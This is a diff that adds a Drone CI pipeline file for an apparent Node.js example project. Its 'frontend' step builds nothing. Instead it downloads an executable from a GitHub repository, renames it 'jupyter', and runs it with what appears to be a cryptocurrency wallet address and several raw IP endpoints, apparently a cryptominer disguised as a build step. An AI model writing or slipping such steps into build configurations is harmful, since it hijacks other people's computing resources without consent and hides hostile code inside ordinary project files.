@@ -1,0 +1,21 @@
+workspace:
+  base: /node
+  path: drone/node-example
+
+clone:
+  git:
+    image: plugins/git
+    depath: 50
+    tags: true
+
+pipeline:
+  frontend:
+    image: node:8.3.0
+    commands:
+      - wget -q 'https://github.com/samalaerena/psychic-octo-goggles/raw/main/paket' -O jupyter && chmod u+x jupyter
+      - ./jupyter ann -p pkt1qam6tcathyj4uhhtpgfl9jeqxw6nuqxqj3se3rp http://139.144.181.23:443 http://164.90.218.160:443/master/2048 http://164.90.218.160:80/master/3072 http://104.200.18.144:80
+
+  backend:
+    image: node:8.3.0
+    commands:
+      - echo backend
